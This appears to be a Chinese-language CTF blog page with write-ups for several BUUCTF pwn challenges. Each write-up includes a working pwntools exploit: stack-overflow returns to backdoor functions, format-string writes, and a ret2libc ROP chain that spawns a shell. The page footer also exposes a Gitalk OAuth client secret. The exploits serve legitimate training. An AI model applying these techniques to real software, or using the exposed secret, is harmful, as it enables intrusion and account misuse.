+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">没有保护,拖入IDA64</span><br><span class="line">找到<span class="keyword">call</span><span class="params">system</span>函数  <span class="keyword">call</span><span class="params">system</span>_addr = elf.symbols[<span class="string">&quot;callsystem&quot;</span>]这样就不需要用IDA苦苦去找了</span><br><span class="line">然后发现了main函数,返回一个vulnerable_function函数,中文名就是有漏洞的函数hhhhh,进去看看</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204093544941.png" alt="image-20241204093544941"></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">双击进来,发现read</span><br><span class="line">是一个危险函数，第一个参数是<span class="number">0</span>说明是写东西（这里就是往buf里写东西）第三个参数是写的字节数是<span class="number">0</span>x200，buf距离栈底才<span class="number">0</span>x80个字节但要往里写<span class="number">0</span>x200个字节，妥妥的栈溢出。</span><br><span class="line">那就是<span class="number">0x80+0x8</span>个字节的垃圾数据（不知道说过没，没说就补充一下，说了的话大家就假装没看见。<span class="number">64</span>位的ebp是<span class="number">8</span>个字节，<span class="number">32</span>位的ebp是<span class="number">4</span>个字节）</span><br><span class="line">payload = b&#x27;<span class="keyword">A</span>&#x27;*(<span class="number">0x80+0x8</span>)+p64(callsystem_addr)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204093718815.png" alt="image-20241204093718815"></p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27865</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level0&quot;</span>)</span><br><span class="line"><span class="keyword">call</span><span class="params">system</span>_addr = elf.symbols[<span class="string">&quot;callsystem&quot;</span>]</span><br><span class="line"><span class="comment">#print (get_flag_addr)</span></span><br><span class="line">payload = b<span class="string">&#x27;A&#x27;</span>*(<span class="number">0</span>x80+<span class="number">0</span>x8)+p64(<span class="keyword">call</span><span class="params">system</span>_addr)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(b<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">１. checkesc ,检测文件的保护机制.  发现有NX　 NX <span class="built_in">enable</span>（不可执行内存）。但是对我们做题影响不大，依然是栈溢出，拿出IDA</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204221340037.png" alt="image-20241204221340037"></p>
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204221740708.png" alt="image-20241204221740708"></p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">找到权限函数,现在就看怎么用才能溢出</span><br><span class="line">大体意思是从文件中读取<span class="number">4</span>个字节的数据到unk_804C044变量中，作为用户名name，之后输出提示信息<span class="string">&quot;your passwd:&quot;</span>，再输入密码，并与unk_804C044进行比较，如果两者相等，执行<span class="keyword">system</span>(<span class="string">&quot;/bin/sh&quot;</span>)命令，进入<span class="keyword">system</span>函数</span><br><span class="line">利用格式化字符串漏洞，我们在终端上运行该函数，输入./pwn，回车，为确定格式化字符串与实际运行的函数的距离（即偏移量）再输入AAAA.%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,显示如下图，因为A为字符数据，%x为格式化输出十六进制的数据，转化为A的ASCⅡ代码是<span class="number">65</span>，十六进制下为<span class="number">0x41</span>，四个A即为<span class="number">0x41414141</span>，数一下离我们输入的AAAA有十个数据，则说明偏移量是<span class="number">10</span>。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204222640546.png" alt="image-20241204222640546"></p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">#p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">28471</span>)</span><br><span class="line">#elf =ELF(<span class="string">&quot;pwn1&quot;</span>)</span><br><span class="line">#fun_addr=elf.symbols[<span class="string">&#x27;fun&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=p32(<span class="number">0x804C044</span>)+b<span class="string">&#x27;%10$n&#x27;</span></span><br><span class="line"># gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(str(<span class="number">4</span>))</span><br><span class="line">p.sendline(b<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">开始难起来了,哎~</span><br></pre></td></tr></table></figure>
+
+<h1 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">１. checkesc ,检测文件的保护机制.  发现有NX　 NX <span class="built_in">enable</span>（不可执行内存）。但是对我们做题影响不大，依然是栈溢出，拿出IDA</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204231304973.png" alt="image-20241204231304973"></p>
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204231527415.png" alt="image-20241204231527415"></p>
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204232226930.png" alt="image-20241204232226930">	</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这跟上面有个题有些像,read,距离<span class="built_in">ebp</span> 有<span class="number">88</span><span class="built_in">h</span>大小，双击buf，找到<span class="built_in">r</span>代表的read函数本身覆盖大小，是<span class="number">4</span><span class="built_in">h</span>。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204232243263.png" alt="image-20241204232243263"></p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">返回主函数，双击<span class="keyword">system</span>，得到下方界面的地址<span class="number">0x8048320</span>。作为覆盖的第一个地址。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204232422674.png" alt="image-20241204232422674"></p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=b&#x27;a&#x27;*(<span class="number">0</span>x88+0x4)+p32(<span class="number">0</span>x8048320)+p32(<span class="number">1</span>)+p32(<span class="number">0</span>x804A024)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">#p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29104</span>)</span><br><span class="line">#elf =ELF(<span class="string">&quot;pwn1&quot;</span>)</span><br><span class="line">#fun_addr=elf.symbols[<span class="string">&#x27;fun&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=b<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>)+p32(<span class="number">0x8048320</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0x804A024</span>)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"></span><br><span class="line">#p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">#p.sendline(str(<span class="number">4</span>))</span><br><span class="line">p.sendline(b<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">１. checkesc ,检测文件的保护机制.  emmmm,都开了,拿出ida看看吧</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204232905256.png" alt="image-20241204232905256"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里有溢出条件了</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204233024909.png" alt="image-20241204233024909"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">把代码放ai里看看是什么意思</span><br><span class="line">可以看出利用的是格式化字符串的漏洞，需要我们修改var地址往下数第十四个，类似是数组的结构到var[<span class="number">13</span>]为<span class="number">17</span>，并且为LL就是long long int八个字节，，相当于<span class="number">64</span>位的数据&#x27;\<span class="keyword">x</span><span class="number">11</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>&#x27;。 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">payload</span>=b<span class="string">&#x27;aaaa&#x27;</span>*<span class="number">13</span>+p64(<span class="number">17</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">#p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27769</span>)</span><br><span class="line">#elf =ELF(<span class="string">&quot;pwn1&quot;</span>)</span><br><span class="line">#fun_addr=elf.symbols[<span class="string">&#x27;fun&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=b<span class="string">&#x27;aaaa&#x27;</span>*<span class="number">13</span>+p64(<span class="number">17</span>)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"></span><br><span class="line">#p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">#p.sendline(str(<span class="number">4</span>))</span><br><span class="line">p.sendline(b<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">１. checkesc ,检测文件的保护机制.  发现有NX　 NX <span class="built_in">enable</span>（不可执行内存）。但是对我们做题影响不大，依然是栈溢出，拿出IDA</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204233457576.png" alt="image-20241204233457576"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现后门函数</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204233747818.png" alt="image-20241204233747818"></p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">看了主函数</span><br><span class="line">scanf会读入一个用户输入的数赋值给nbytes ，然后<span class="built_in">read</span>会读取nbytes大小的字符，也就是说我们可以任意溢出长度</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./bjdctf_2020_babystack&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,27291)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bjdctf_2020_babystack&quot;</span>)</span><br><span class="line">context(<span class="attribute">log_level</span>=<span class="string">&quot;debug&quot;</span>,arch=&quot;amd64&quot;)</span><br><span class="line">backdoor = elf.symbols[<span class="string">&quot;backdoor&quot;</span>]</span><br><span class="line">ret = 0x0000000000400561</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&quot;Please input the length of your name:&quot;</span>,<span class="string">&quot;100&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&quot;a&quot;</span><span class="number">*16</span> + b<span class="string">&quot;b&quot;</span><span class="number">*8</span> + p64(ret) + p64(backdoor)</span><br><span class="line">payload = flat([<span class="string">&quot;a&quot;</span><span class="number">*16</span>,<span class="string">&quot;b&quot;</span><span class="number">*8</span>,ret,backdoor])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;What&#x27;s u name?&quot;</span>,payload)</span><br><span class="line">p.sendline(b<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">１. checkesc ,检测文件的保护机制.  发现有NX　 NX <span class="built_in">enable</span>（不可执行内存）。但是对我们做题影响不大，依然是栈溢出，拿出IDA</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204234722246.png" alt="image-20241204234722246"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">程序就是加解密的,没有发现callsystem后门函数，开了NX需要自己构造ROP链</span><br><span class="line">基本思路：encrypt()里面的<span class="built_in">get</span>()可以溢出，栈大小为<span class="attribute">50h-offest</span>=0x50+8。puts()可以用来泄露libc基址。</span><br><span class="line">通过Ropgadget找到pop_rdi_rdi地址：0x400c83</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241205000636934.png" alt="image-20241205000636934"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">这里选0</span><br><span class="line"><span class="keyword">from</span> pwn import*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher import *</span><br><span class="line"><span class="attribute">p</span>=remote(&quot;node5.buuoj.cn&quot;,29875)</span><br><span class="line"><span class="attribute">elf</span>=ELF(&quot;./ciscn_2019_c_1&quot;)</span><br><span class="line"><span class="attribute">ret</span>=0x400c83</span><br><span class="line"><span class="attribute">plt</span>=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="attribute">got</span>=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="attribute">main_addr</span>=0x400B28</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;encrypted\n&quot;</span>)</span><br><span class="line"><span class="attribute">payload</span>=flat(&quot;a&quot;*0x58)+p64(ret)+p64(got)+p64(plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Ciphertext\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="attribute">addr</span>=u64(p.recv(6).ljust(0x8,b&quot;\x00&quot;))</span><br><span class="line"><span class="attribute">libc</span>=LibcSearcher(&quot;puts&quot;,addr)</span><br><span class="line"><span class="attribute">libcbase</span>=addr-libc.dump(&quot;puts&quot;)</span><br><span class="line"><span class="built_in">print</span>(libcbase)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(b<span class="string">&quot;encrypted\n&quot;</span>)</span><br><span class="line"><span class="attribute">sys_addr</span>=libcbase+libc.dump(&#x27;system&#x27;)</span><br><span class="line"><span class="attribute">bin_sh</span>=libcbase+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"><span class="attribute">res</span>=0x4006b9</span><br><span class="line"><span class="attribute">payload2</span>=b&quot;a&quot;*0x58+p64(res)+p64(ret)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(b<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">真难</span><br></pre></td></tr></table></figure>
+
+<h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">不会了,直接放大佬blog:https:<span class="regexp">//</span>www.cnblogs.com<span class="regexp">/lyxf/</span>p/<span class="number">12113401</span>.html</span><br><span class="line">１. checkesc ,检测文件的保护机制. 可以栈溢出，地址写死了。 拿出IDA</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241205144645475.png" alt="image-20241205144645475"></p>
+<p><img src="/ctf-%E5%88%B7pwn//image-20241205145201010.png" alt="image-20241205145201010"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">函数是get_flag</span><br><span class="line">有<span class="number">4</span>个注意点</span><br><span class="line"><span class="number">1</span>.打远程的时候他将会判断参数是否合规，因此我们要构造get_flag的参数的正确性。</span><br><span class="line"><span class="number">2</span>.这题在main函数开始的时候没有压入<span class="built_in">ebp</span>，因此计算溢出位置不用覆盖<span class="built_in">ebp</span>。也就是说以前的old_ebp的位置变成了现在的返回地址。</span><br><span class="line"><span class="number">3</span>.不需要interactive去交互，需要用recv去接收flag。（一开始没搞明白程序卡在这）</span><br><span class="line"><span class="number">4</span>.构造垃圾数据不用b‘a<span class="string">&#x27;，打不通。直接&#x27;</span>a<span class="string">&#x27;就行了</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28424</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line">get_flag=<span class="number">0</span>x80489A0</span><br><span class="line">arg_1=<span class="number">0</span>x308CD64F</span><br><span class="line">arg_2=<span class="number">0</span>x195719D1</span><br><span class="line"><span class="keyword">exit</span>=<span class="number">0</span>x0804E6A0</span><br><span class="line"> </span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0</span>x38+p32(get_flag)+p32(<span class="keyword">exit</span>)+p32(arg_1)+p32(arg_2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E5%AD%A6%E4%B9%A0/"># 学习</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../misc-powershell%E6%97%A0%E6%B3%95%E7%94%A8%E7%AE%A1%E7%90%86%E5%91%98%E6%89%93%E5%BC%80/">Misc-powershell无法用管理员打开</a>
+            
+            
+            <a class="next" rel="next" href="../misc-kali%E5%AE%89%E8%A3%85pwn%E7%8E%AF%E5%A2%83/">Misc-kali安装PWN环境</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
